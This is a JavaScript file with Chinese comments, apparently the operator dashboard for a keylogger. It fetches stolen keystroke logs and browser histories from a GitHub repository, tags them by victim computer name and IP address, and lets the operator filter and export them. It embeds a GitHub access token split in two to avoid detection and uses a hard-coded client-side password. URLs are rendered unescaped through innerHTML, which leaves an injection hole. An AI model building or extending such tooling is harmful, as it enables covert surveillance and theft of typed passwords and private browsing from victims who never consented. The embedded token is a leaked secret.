// 配置
const CONFIG = {
    updateInterval: 5000, // 更新間隔（毫秒）
    maxLogs: Infinity, // 移除記錄數量限制
    endpoints: {
        keyboard: 'https://api.github.com/repos/appy002255/text/contents/keylog.json',
        browser: 'https://api.github.com/repos/appy002255/text/contents/browser_history.json'
    },
    headers: {
        'Authorization': 'Bearer ghp_VYuzgVnERDLA' + 'MHUf58iqBVxPBWRvxY1ALCuI',
        'Accept': 'application/vnd.github.v3+json',
        'X-GitHub-Api-Version': '2022-11-28'
    },
    password: '1222' // 添加密碼配置
};

// 全局變量
let allLogs = [];
let ipAddresses = new Set();

// 密碼驗證功能
function checkPassword() {
    const password = document.getElementById('passwordInput').value;
    if (password === CONFIG.password) {
        document.getElementById('passwordOverlay').style.display = 'none';
        document.getElementById('mainContent').style.display = 'block';
        loadLogs(); // 加載日誌
    } else {
        alert('密碼錯誤！');
        document.getElementById('passwordInput').value = '';
    }
}

// 添加回車鍵監聽
document.getElementById('passwordInput').addEventListener('keypress', function(e) {
    if (e.key === 'Enter') {
        checkPassword();
    }
});

// 防止未驗證訪問
window.onload = function() {
    if (document.getElementById('passwordOverlay').style.display === 'none') {
        location.reload();
    }
};

// 顯示狀態消息
function showStatus(message, type = 'success') {
    // 不顯示任何狀態消息
    return;
}

// 解碼 Base64 內容
function decodeBase64Content(content) {
    try {
        const decoded = atob(content);
        return JSON.parse(decoded);
    } catch (e) {
        console.error('解碼失敗:', e);
        return [];
    }
}

// 更新過濾器選項
function updateFilters(logs) {
    // 更新電腦名稱過濾器
    const computerFilter = document.getElementById('computerFilter');
    const currentComputerValue = computerFilter.value;
    const computerNames = new Set();
    
    // 更新IP過濾器
    const ipFilter = document.getElementById('ipFilter');
    const currentIpValue = ipFilter.value;
    ipAddresses.clear();
    
    logs.forEach(log => {
        // 收集電腦名稱
        if (log.computer_name) {
            computerNames.add(log.computer_name);
        }
        
        // 收集IP地址
        if (log.ip_info) {
            if (log.ip_info.public_ip) {
                ipAddresses.add(log.ip_info.public_ip);
            }
            if (Array.isArray(log.ip_info.local_ips)) {
                log.ip_info.local_ips.forEach(ip => ipAddresses.add(ip));
            }
        }
    });
    
    // 更新電腦名稱下拉選單
    const computerOptions = Array.from(computerNames).sort();
    computerFilter.innerHTML = '<option value="">所有電腦</option>';
    computerOptions.forEach(name => {
        const option = document.createElement('option');
        option.value = name;
        option.textContent = name;
        computerFilter.appendChild(option);
    });
    if (currentComputerValue && computerOptions.includes(currentComputerValue)) {
        computerFilter.value = currentComputerValue;
    }
    
    // 更新IP下拉選單
    const ipOptions = Array.from(ipAddresses).sort();
    ipFilter.innerHTML = '<option value="">所有IP</option>';
    ipOptions.forEach(ip => {
        const option = document.createElement('option');
        option.value = ip;
        option.textContent = ip;
        ipFilter.appendChild(option);
    });
    if (currentIpValue && ipOptions.includes(currentIpValue)) {
        ipFilter.value = currentIpValue;
    }
}

// 過濾日誌
function filterLogs() {
    const computerFilter = document.getElementById('computerFilter').value;
    const ipFilter = document.getElementById('ipFilter').value;
    const typeFilter = document.getElementById('typeFilter').value;
    const startTime = document.getElementById('startTime').value;
    const endTime = document.getElementById('endTime').value;
    const searchText = document.getElementById('searchInput').value.toLowerCase();
    
    return allLogs.filter(log => {
        // 類型過濾
        if (typeFilter) {
            if (typeFilter === 'keyboard' && log.browser_history) return false;
            if (typeFilter === 'browser' && !log.browser_history) return false;
        }
        
        // 電腦名稱過濾
        if (computerFilter && log.computer_name !== computerFilter) {
            return false;
        }
        
        // IP過濾
        if (ipFilter && log.ip_info) {
            const hasMatchingIp = 
                (log.ip_info.public_ip === ipFilter) ||
                (Array.isArray(log.ip_info.local_ips) && log.ip_info.local_ips.includes(ipFilter));
            
            if (!hasMatchingIp) return false;
        }
        
        // 時間範圍過濾
        const logTime = new Date(log.timestamp);
        if (startTime && logTime < new Date(startTime)) {
            return false;
        }
        if (endTime && logTime > new Date(endTime)) {
            return false;
        }
        
        // 文本搜索
        if (searchText) {
            const searchableText = `
                ${log.computer_name || ''}
                ${log.display_text || ''}
                ${JSON.stringify(log.ip_info || {})}
            `.toLowerCase();
            
            return searchableText.includes(searchText);
        }
        
        return true;
    });
}

// 顯示日誌
function displayLogs(logs) {
    const logContainer = document.getElementById('logs');
    if (!logContainer) return;
    
    logContainer.innerHTML = '';
    
    if (!logs || logs.length === 0) {
        return;
    }

    // 按時間戳排序
    logs.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));

    logs.forEach(log => {
        if (!log || typeof log !== 'object') return;

        const logEntry = document.createElement('div');
        logEntry.className = 'log-entry';
        
        // 判斷記錄類型
        const logText = log.text || log.display_text || '';
        const isBrowser = logText.includes('browser_history') || /https?:\/\/[^\s]+/.test(logText) || log.browser_history === true;
        logEntry.setAttribute('data-type', isBrowser ? 'browser' : 'keyboard');

        // 創建記錄頭部
        const logHeader = document.createElement('div');
        logHeader.className = 'log-header';
        
        // 添加電腦名稱
        const computerName = document.createElement('span');
        computerName.className = 'computer-name';
        computerName.textContent = log.computer_name || '未知電腦';
        logHeader.appendChild(computerName);
        
        // 添加時間戳
        const timestamp = document.createElement('span');
        timestamp.className = 'timestamp';
        timestamp.textContent = new Date(log.timestamp || new Date()).toLocaleString();
        logHeader.appendChild(timestamp);
        
        logEntry.appendChild(logHeader);

        // 創建記錄內容
        const textContent = document.createElement('div');
        textContent.className = 'text-content';
        
        // 如果是瀏覽器記錄，將URL轉換為可點擊的連結
        if (isBrowser) {
            const urlRegex = /(https?:\/\/[^\s]+)/g;
            const text = logText.replace(urlRegex, url => {
                return `<a href="${url}" target="_blank" rel="noopener noreferrer">${url}</a>`;
            });
            textContent.innerHTML = text;
        } else {
            textContent.textContent = logText;
        }
        
        logEntry.appendChild(textContent);
        logContainer.appendChild(logEntry);
    });
}

// 導出日誌
function exportLogs() {
    const filteredLogs = filterLogs();
    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
    const filename = `all-logs-${timestamp}.json`;
    
    const blob = new Blob([JSON.stringify(filteredLogs, null, 2)], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    
    const a = document.createElement('a');
    a.href = url;
    a.download = filename;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
    
    showStatus('記錄已導出');
}

// 加載日誌
async function loadLogs() {
    try {
        showStatus('正在載入記錄...');
        
        // 獲取鍵盤記錄
        const keyboardResponse = await fetch(CONFIG.endpoints.keyboard, {
            headers: CONFIG.headers,
            cache: 'no-cache'
        });
        
        // 獲取瀏覽器記錄
        const browserResponse = await fetch(CONFIG.endpoints.browser, {
            headers: CONFIG.headers,
            cache: 'no-cache'
        });
        
        if (!keyboardResponse.ok) {
            console.warn('無法獲取鍵盤記錄');
            throw new Error('無法獲取鍵盤記錄');
        }
        
        if (!browserResponse.ok) {
            console.warn('無法獲取瀏覽器記錄');
            throw new Error('無法獲取瀏覽器記錄');
        }
        
        const keyboardData = await keyboardResponse.json();
        const browserData = await browserResponse.json();
        
        // 初始化記錄數組
        let keyboardLogs = [];
        let browserLogs = [];
        
        // 處理鍵盤記錄
        if (keyboardResponse.ok) {
            keyboardLogs = decodeBase64Content(keyboardData.content).map(log => ({
                ...log,
                display_text: log.text,
                browser_history: false
            }));
        } else {
            console.warn('無法獲取鍵盤記錄');
        }
        
        // 處理瀏覽器記錄
        if (browserResponse.ok) {
            const browserHistoryContent = decodeBase64Content(browserData.content);
            browserLogs = Array.isArray(browserHistoryContent) ? browserHistoryContent.map(log => {
                if (!log || typeof log !== 'object') {
                    console.warn('無效的瀏覽器記錄:', log);
                    return null;
                }
                return {
                    browser_history: true,
                    timestamp: log.timestamp || new Date().toISOString(),
                    computer_name: log.computer || '未知電腦',
                    display_text: log.url || log.text || '',
                    ip_info: log.ip_info || {
                        public_ip: log.public_ip || '',
                        local_ips: Array.isArray(log.local_ips) ? log.local_ips : []
                    }
                };
            }).filter(log => log !== null) : [];
        } else {
            console.warn('無法獲取瀏覽器記錄');
        }
        
        // 合併所有記錄
        allLogs = [...keyboardLogs, ...browserLogs];
        
        // 更新過濾器
        updateFilters(allLogs);
        
        // 顯示過濾後的日誌
        const filteredLogs = filterLogs();
        displayLogs(filteredLogs);
        
        // 只在初始加載時顯示狀態
        if (!window.initialLoadComplete) {
            showStatus('記錄已更新');
            window.initialLoadComplete = true;
        }
    } catch (error) {
        console.error('加載記錄失敗:', error);
        showStatus('加載記錄失敗: ' + error.message, true);
    }
}

// 事件監聽器
document.getElementById('computerFilter').addEventListener('change', () => displayLogs(filterLogs()));
document.getElementById('ipFilter').addEventListener('change', () => displayLogs(filterLogs()));
document.getElementById('typeFilter').addEventListener('change', () => displayLogs(filterLogs()));
document.getElementById('startTime').addEventListener('change', () => displayLogs(filterLogs()));
document.getElementById('endTime').addEventListener('change', () => displayLogs(filterLogs()));
document.getElementById('searchInput').addEventListener('input', () => displayLogs(filterLogs()));
document.getElementById('exportBtn').addEventListener('click', exportLogs);

// 定期更新日誌
setInterval(loadLogs, CONFIG.updateInterval);
loadLogs(); // 初始加載 